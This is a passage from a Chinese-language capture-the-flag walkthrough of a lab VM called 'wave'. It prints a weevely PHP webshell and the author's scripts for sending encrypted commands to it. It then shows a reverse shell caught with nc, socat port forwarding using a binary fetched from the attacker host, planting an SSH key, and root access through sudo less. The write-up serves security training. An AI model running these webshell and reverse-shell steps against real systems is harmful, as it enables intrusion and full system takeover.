+<span class="pl-s">for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span>
+<span class="pl-s">{</span>
+<span class="pl-s">$o.=$t[$i]^$k[$j];</span>
+<span class="pl-s">}</span>
+<span class="pl-s">}</span>
+<span class="pl-s">return $o;</span>
+<span class="pl-s">}</span>
+<span class="pl-s">if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {</span>
+<span class="pl-s">@ob_start();</span>
+<span class="pl-s">@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));</span>
+<span class="pl-s">$o=@ob_get_contents();</span>
+<span class="pl-s">@ob_end_clean();</span>
+<span class="pl-s">$r=@base64_encode(@x(@gzcompress($o),$k));</span>
+<span class="pl-s">print("$p$kh$r$kf");</span>
+<span class="pl-s">}<span class="pl-pds">'</span></span>)<span class="pl-k">;</span>                                                                                                                                </pre></div>
+<p>确实是<strong>Webshell 后门</strong>，我们尝试利用一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
+└─$ cat tool.php 
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>php
+<span class="pl-smi">$k</span> = <span class="pl-s"><span class="pl-pds">"</span>3ddf0d5c<span class="pl-pds">"</span></span><span class="pl-k">;</span>  // 密钥
+
+<span class="pl-k">function</span> <span class="pl-en">x($t,</span> <span class="pl-smi">$k</span>)
+{
+    <span class="pl-smi">$c</span> = strlen(<span class="pl-smi">$k</span>)<span class="pl-k">;</span>  // 密钥长度
+    <span class="pl-smi">$l</span> = strlen(<span class="pl-smi">$t</span>)<span class="pl-k">;</span>  // 文本长度
+    <span class="pl-smi">$o</span> = <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span><span class="pl-k">;</span>
+
+    // XOR 加密/解密
+    <span class="pl-k">for</span> (<span class="pl-smi">$i</span> = 0<span class="pl-k">;</span> <span class="pl-smi">$i</span> <span class="pl-k">&lt;</span> <span class="pl-smi">$l</span><span class="pl-k">;</span>)
+    {
+        <span class="pl-k">for</span> (<span class="pl-smi">$j</span> = 0<span class="pl-k">;</span> (<span class="pl-smi">$j</span> <span class="pl-k">&lt;</span> <span class="pl-smi">$c</span> <span class="pl-k">&amp;&amp;</span> <span class="pl-smi">$i</span> <span class="pl-k">&lt;</span> <span class="pl-smi">$l</span>)<span class="pl-k">;</span> <span class="pl-smi">$j</span>++, <span class="pl-smi">$i</span>++)
+        {
+            <span class="pl-smi">$o</span> .= chr(ord(<span class="pl-smi">$t</span>[<span class="pl-smi">$i</span>]) ^ ord(<span class="pl-smi">$k</span>[<span class="pl-smi">$j</span>]))<span class="pl-k">;</span>
+        }
+    }
+    <span class="pl-k">return</span> <span class="pl-smi">$o</span><span class="pl-k">;</span>
+}
+
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>选择操作：\n<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>1. 加密\n<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>2. 解密\n<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$choice</span> = trim(fgets(STDIN))<span class="pl-k">;</span>  // 获取用户输入
+
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>请输入文本：\n<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$input_text</span> = trim(fgets(STDIN))<span class="pl-k">;</span>  // 获取要加密/解密的文本
+
+<span class="pl-k">if</span> (<span class="pl-smi">$choice</span> == 1) {
+    // 加密
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>加密前的文本: <span class="pl-pds">"</span></span> <span class="pl-c1">.</span> <span class="pl-smi">$input_text</span> <span class="pl-c1">.</span> <span class="pl-s"><span class="pl-pds">"</span>\n<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+
+    // 压缩文本
+    <span class="pl-smi">$compressed_text</span> = gzcompress(<span class="pl-smi">$input_text</span>)<span class="pl-k">;</span>  // 压缩文本
+    <span class="pl-smi">$encrypted_text</span> = x(<span class="pl-smi">$compressed_text</span>, <span class="pl-smi">$k</span>)<span class="pl-k">;</span>   // XOR 加密
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>加密后的文本: <span class="pl-pds">"</span></span> <span class="pl-c1">.</span> base64_encode(<span class="pl-smi">$encrypted_text</span>) <span class="pl-c1">.</span> <span class="pl-s"><span class="pl-pds">"</span>\n<span class="pl-pds">"</span></span><span class="pl-k">;</span>  // 输出 Base64 编码后的加密文本
+} elseif (<span class="pl-smi">$choice</span> == 2) {
+    // 解密
+    <span class="pl-smi">$decoded_text</span> = base64_decode(<span class="pl-smi">$input_text</span>)<span class="pl-k">;</span>  // Base64 解码
+    <span class="pl-smi">$decrypted_text</span> = x(<span class="pl-smi">$decoded_text</span>, <span class="pl-smi">$k</span>)<span class="pl-k">;</span>      // XOR 解密
+  
+    // 解压缩
+    <span class="pl-smi">$decompressed</span> = @gzuncompress(<span class="pl-smi">$decrypted_text</span>)<span class="pl-k">;</span>  // 解压缩，使用 @ 避免警告
+  
+    // 如果解压成功，则输出解压后的内容；否则输出解密后的内容
+    <span class="pl-k">if</span> (<span class="pl-smi">$decompressed</span> <span class="pl-k">!</span>== false) {
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>解密并解压后的文本: <span class="pl-pds">"</span></span> <span class="pl-c1">.</span> <span class="pl-smi">$decompressed</span> <span class="pl-c1">.</span> <span class="pl-s"><span class="pl-pds">"</span>\n<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+    } <span class="pl-k">else</span> {
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>解密后的文本: <span class="pl-pds">"</span></span> <span class="pl-c1">.</span> <span class="pl-smi">$decrypted_text</span> <span class="pl-c1">.</span> <span class="pl-s"><span class="pl-pds">"</span>\n<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+    }
+} <span class="pl-k">else</span> {
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>无效的选项\n<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+}
+<span class="pl-k">?</span><span class="pl-k">&gt;</span></pre></div>
+<p>加密和解密模块（解密模块是乱码，建议不用，或者自己改）。发送模块我们还差一个网址，我们之前用那个是备份文件，我们知道它的命名规则，那我们尝试爆破</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -c -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.138/weevelyFUZZ<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt --hc 404   
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="pl-s"><span class="pl-pds">'</span>s documentation for more information.</span>
+<span class="pl-s">********************************************************</span>
+<span class="pl-s">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span>
+<span class="pl-s">********************************************************</span>
+<span class="pl-s"></span>
+<span class="pl-s">Target: http://192.168.205.138/weevelyFUZZ</span>
+<span class="pl-s">Total requests: 66885</span>
+<span class="pl-s"></span>
+<span class="pl-s">=====================================================================</span>
+<span class="pl-s">ID           Response   Lines    Word       Chars       Payload                                                             </span>
+<span class="pl-s">=====================================================================</span>
+<span class="pl-s"></span>
+<span class="pl-s">000000037:   200        0 L      0 W        0 Ch        ".php7"                                                             </span>
+<span class="pl-s">000000248:   404        7 L      11 W       153 Ch      ".lOg"                                                              </span>
+<span class="pl-s"></span>
+<span class="pl-s">Total time: 2.123899</span>
+<span class="pl-s">Processed Requests: 246</span>
+<span class="pl-s">Filtered Requests: 245</span>
+<span class="pl-s">Requests/sec.: 115.8246</span>
+<span class="pl-s"></span>
+<span class="pl-s"></span></pre></div>
+<p>根据已知信息编写脚本</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
+└─$ cat request.py 
+import requests
+import base64
+
+<span class="pl-c"><span class="pl-c">#</span> 密钥 (与 PHP 脚本中的密钥一致)</span>
+kh = <span class="pl-s"><span class="pl-pds">"</span>b6e7a529b6c2<span class="pl-pds">"</span></span>
+kf = <span class="pl-s"><span class="pl-pds">"</span>d598a771749b<span class="pl-pds">"</span></span>
+p = <span class="pl-s"><span class="pl-pds">"</span>afnqDsRcBpVmU71y<span class="pl-pds">"</span></span>
+
+def <span class="pl-en">main</span>():
+    <span class="pl-c"><span class="pl-c">#</span> 输入要发送的字符串</span>
+    input_data = input(<span class="pl-s"><span class="pl-pds">"</span>Enter the string to send: <span class="pl-pds">"</span></span>)
+
+    <span class="pl-c"><span class="pl-c">#</span> 构造带有编码数据的请求体</span>
+    request_data = f<span class="pl-s"><span class="pl-pds">"</span>{kh}{input_data}{kf}<span class="pl-pds">"</span></span>
+
+    url = <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.138/weevely.php7<span class="pl-pds">"</span></span>  <span class="pl-c"><span class="pl-c">#</span> 请根据实际情况修改</span>
+
+    <span class="pl-c"><span class="pl-c">#</span> 发送 POST 请求</span>
+    response = requests.post(url, data=request_data)
+
+    <span class="pl-c"><span class="pl-c">#</span> 打印响应报文</span>
+    print(<span class="pl-s"><span class="pl-pds">"</span>Response:<span class="pl-pds">"</span></span>, response.text)
+
+<span class="pl-k">if</span> __name__ == <span class="pl-s"><span class="pl-pds">"</span>__main__<span class="pl-pds">"</span></span>:
+    <span class="pl-en">main</span>()
+</pre></div>
+<p>发送模块。我们尝试一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
+└─$ php tool.php
+选择操作：
+1. 加密
+2. 解密
+1
+请输入文本：
+system(<span class="pl-s"><span class="pl-pds">"</span>ping -c2 192.168.205.141<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
+加密前的文本: system(<span class="pl-s"><span class="pl-pds">"</span>ping -c2 192.168.205.141<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
+加密后的文本: S/hPyBxKfK7mNE6u/C9is35SNlaEUOdQB9e0VQJU4FAHVTC0hGI1ozptfA==
+
+┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
+└─$ python3 request.py
+Enter the string to send: S/hPyBxKfK7mNE6u/C9is35SNlaEUOdQB9e0VQJU4FAHVTC0hGI1ozptfA==
+Response: afnqDsRcBpVmU71yb6e7a529b6c2S/jp6f3u9yMj4Isfut49aVWaVqAvrEySgZxiVBbHOVl6KFMHTZ944ZQclbQEIWC05MOHiT+Q62uui+A3K8WYpUFCyNb58w7Y8YGh+OA4ZFpFRq2La91DLq87XUak1QjwTHJ+qr8GRRC72jSkqEkXHi5T197tvwT9lw2e5+7iz2VRo+VepOD08CvQytpLQkWEWe7lv2cPLReNkMV5R9FNGMMM7LBjd4Gx6rS3VxPib9nNQsedo9XHXjkoCy4V1mmqug38XPsihxwXSDrMd598a771749b
+                                      
+┌──(kali㉿kali)-[~/test]
+└─$ sudo tcpdump -A -n icmp
+[sudo] kali 的密码：
+tcpdump: verbose output suppressed, use -v[v]... <span class="pl-k">for</span> full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+19:22:08.263760 IP 192.168.205.138 <span class="pl-k">&gt;</span> 192.168.205.141: ICMP <span class="pl-c1">echo</span> request, id 58412, seq 1, length 64
+E..T..@.@..Z...........c.,.....g....p....................... <span class="pl-k">!</span><span class="pl-s"><span class="pl-pds">"</span>#$%&amp;'()*+,-./01234567</span>
+<span class="pl-s">19:22:08.263782 IP 192.168.205.141 &gt; 192.168.205.138: ICMP echo reply, id 58412, seq 1, length 64</span>
+<span class="pl-s">E..T....@.\F...........c.,.....g....p....................... !<span class="pl-pds">"</span></span><span class="pl-c"><span class="pl-c">#</span>$%&amp;'()*+,-./01234567</span>
+19:22:09.276459 IP 192.168.205.138 <span class="pl-k">&gt;</span> 192.168.205.141: ICMP <span class="pl-c1">echo</span> request, id 58412, seq 2, length 64
+E..T.(@.@..............1.,.....g............................ <span class="pl-k">!</span><span class="pl-s"><span class="pl-pds">"</span>#$%&amp;'()*+,-./01234567</span>
+<span class="pl-s"></span></pre></div>
+<p>运行正常，我们弹shell</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
+└─$ python3 request.py
+Enter the string to send: S/hPyBxKfK7mNK4tZlSBV+FXUNXgVwdT5ldQV2TUNWE2uTBjzcD5X87AoIQ8QXgIM1fValA=
+
+┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888             
+listening on [any] 8888 ...
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 58888
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+<h1>3. 获得稳定的 Shell</h1>
+<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+ctrl+z  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
+<h1>4.提权</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@wave:<span class="pl-k">~</span>/html$ sudo -l  
+[sudo] password <span class="pl-k">for</span> www-data: 
+sudo: a password is required
+www-data@wave:<span class="pl-k">~</span>/html$ ls -la
+total 32
+drwxr-xr-x 3 www-data www-data 4096 Sep  5  2023 <span class="pl-c1">.</span>
+drwxr-xr-x 3 root     root     4096 Sep  4  2023 ..
+drwxr-xr-x 2 www-data www-data 4096 Sep  5  2023 backup
+-rw-r--r-- 1 www-data www-data   31 Sep  4  2023 index.html
+-rw-r--r-- 1 www-data www-data   32 Sep  4  2023 phptest.php
+-rw-r--r-- 1 www-data www-data   18 Sep  4  2023 robots.txt
+-rw-r--r-- 1 root     root      515 Sep  5  2023 weevely.bck
+-rw-r--r-- 1 www-data www-data  515 Sep  5  2023 weevely.php7
+www-data@wave:<span class="pl-k">~</span>/html$ <span class="pl-c1">cd</span> /home/
+www-data@wave:/home$ ls -al
+total 16
+drwxr-xr-x  4 root  root  4096 Sep  4  2023 <span class="pl-c1">.</span>
+drwxr-xr-x 18 root  root  4096 Sep  4  2023 ..
+drwx------  4 angie angie 4096 Jan 18 10:40 angie
+drwx------  2 carla carla 4096 Sep  4  2023 carla
+www-data@wave:/home$ <span class="pl-c1">cd</span> /opt/
+www-data@wave:/opt$ ls -al
+total 12
+drwxr-xr-x  2 root root  4096 Sep  4  2023 <span class="pl-c1">.</span>
+drwxr-xr-x 18 root root  4096 Sep  4  2023 ..
+-rwxrwxr--  1 root carla   46 Sep  4  2023 secret.txt
+www-data@wave:/opt$ cat secret.txt 
+Dietro di lui, 
+dietro di lui solo la nebbia.
+www-data@wave:/opt$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/newgrp
+www-data@wave:/opt$ /sbin/getcap -r / <span class="pl-k">2&gt;</span>/dev/null
+/usr/bin/ping cap_net_raw=ep
+www-data@wave:/opt$ ss -tuln <span class="pl-k">|</span> grep tcp
+tcp   LISTEN 0      1024       127.0.0.1:3923      0.0.0.0:<span class="pl-k">*</span>            
+tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:<span class="pl-k">*</span>    
+tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:<span class="pl-k">*</span>    
+tcp   LISTEN 0      128             [::]:22           [::]:<span class="pl-k">*</span>    
+tcp   LISTEN 0      511             [::]:80           [::]:<span class="pl-k">*</span>   </pre></div>
+<p>有个未知端口，我们转发一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@wave:<span class="pl-k">~</span>/html$ <span class="pl-c1">cd</span> /tmp/
+www-data@wave:/tmp$ wget 192.168.205.141/socat
+--2025-01-18 13:20:09--  http://192.168.205.141/socat
+Connecting to 192.168.205.141:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 375176 (366K) [application/octet-stream]
+Saving to: <span class="pl-s"><span class="pl-pds">'</span>socat<span class="pl-pds">'</span></span>
+
+socat                                                        0%[                                                                       socat                                                      100%[<span class="pl-k">========================================================================================================================================&gt;</span>] 366.38K  --.-KB/s    <span class="pl-k">in</span> 0.003s  
+
+2025-01-18 13:20:09 (105 MB/s) - <span class="pl-s"><span class="pl-pds">'</span>socat<span class="pl-pds">'</span></span> saved [375176/375176]
+
+www-data@wave:/tmp$ chmod +x socat 
+www-data@wave:/tmp$ ./socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:3923 <span class="pl-k">&amp;</span>
+[1] 592</pre></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/74b5fd1f-838c-462a-acb9-576e7a15086e"><img src="https://github.com/user-attachments/assets/74b5fd1f-838c-462a-acb9-576e7a15086e" alt="Image" style="max-width: 100%;"></a></p>
+<p>像个文件管理器，而且看样子它还是在家目录下，我们尝试上传一个密钥上去看看能不能一发入魂</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">mkdir .ssh
+<span class="pl-c1">cd</span> .ssh
+ssh-keygen -t rsa 
+Generating public/private rsa key pair.
+Enter file <span class="pl-k">in</span> which to save the key (/home/kali/.ssh/id_rsa): id_rsa
+Enter passphrase (empty <span class="pl-k">for</span> no passphrase): 123456
+Enter same passphrase again: 123456
+
+┌──(kali㉿kali)-[~/test/.ssh]
+└─$ ls -al
+总计 20
+drwxrwxr-x  3 kali kali 4096  1月18日 20:34 <span class="pl-c1">.</span>
+drwxrwxr-x 10 kali kali 4096  1月18日 20:31 ..
+-rw-r--r--  1 kali kali  563  1月18日 17:40 authorized_keys
+-rw-------  1 kali kali 2635  1月18日 17:40 id_rsa
+drwxrwxr-x  2 kali kali 4096  1月18日 20:35 .ssh
+
+
+┌──(kali㉿kali)-[~/test/.ssh]
+└─$ ls -la .ssh/              
+总计 12
+drwxrwxr-x 2 kali kali 4096  1月18日 20:35 <span class="pl-c1">.</span>
+drwxrwxr-x 3 kali kali 4096  1月18日 20:34 ..
+-rw-r--r-- 1 kali kali  563  1月18日 17:40 authorized_keys
+                                                            </pre></div>
+<p>记得在里面再创建一个<code class="notranslate">.ssh</code>文件夹，并且把<code class="notranslate">id\_rsa.pub</code>改名为<code class="notranslate">authorized_keys</code>，然后打开你的文件管理器把<code class="notranslate">.ssh</code>（只有<code class="notranslate">authorized_keys</code>那个）文件夹<strong>拖进去上传</strong></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a896ce7c-321b-4eb0-a253-bef4e2a7d01a"><img src="https://github.com/user-attachments/assets/a896ce7c-321b-4eb0-a253-bef4e2a7d01a" alt="Image" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/.ssh]
+└─$ ssh angie@192.168.205.138 -i id_rsa
+The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>192.168.205.138 (192.168.205.138)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
+<span class="pl-s">ED25519 key fingerprint is SHA256:6XC0N82ZtO32MzrvGO7WaR/Yg+rpDa0Wkgoy3H8IdnE.</span>
+<span class="pl-s">This key is not known by any other names.</span>
+<span class="pl-s">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="pl-s">Warning: Permanently added <span class="pl-pds">'</span></span>192.168.205.138<span class="pl-s"><span class="pl-pds">'</span> (ED25519) to the list of known hosts.</span>
+<span class="pl-s">Enter passphrase for key <span class="pl-pds">'</span></span>id_rsa<span class="pl-s"><span class="pl-pds">'</span>: </span>
+<span class="pl-s">Linux wave 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64</span>
+<span class="pl-s"></span>
+<span class="pl-s">The programs included with the Debian GNU/Linux system are free software;</span>
+<span class="pl-s">the exact distribution terms for each program are described in the</span>
+<span class="pl-s">individual files in /usr/share/doc/*/copyright.</span>
+<span class="pl-s"></span>
+<span class="pl-s">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="pl-s">permitted by applicable law.</span>
+<span class="pl-s">Last login: Tue Sep  5 11:14:50 2023 from 192.168.0.100</span>
+<span class="pl-s">angie@wave:~$ id</span>
+<span class="pl-s">uid=1000(angie) gid=1000(angie) grupos=1000(angie),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)</span>
+<span class="pl-s"></span></pre></div>
+<p>尝试提权</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">angie@wave:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> angie on wave:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin, use_pty
+
+User angie may run the following commands on wave:
+    (ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt
+angie@wave:<span class="pl-k">~</span>$ sudo /usr/bin/less -F /opt/secret.txt
+Dietro di lui, 
+dietro di lui solo la nebbia.
+</pre></div>
+<p>小窗提权？</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f85836de-c61b-43be-9851-7a6fb509c529"><img src="https://github.com/user-attachments/assets/f85836de-c61b-43be-9851-7a6fb509c529" alt="Image" style="max-width: 100%;"></a></p>
+<p>还真是</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@wave:/home/angie# id
+uid=0(root) gid=0(root) grupos=0(root)
+</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Triumph Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
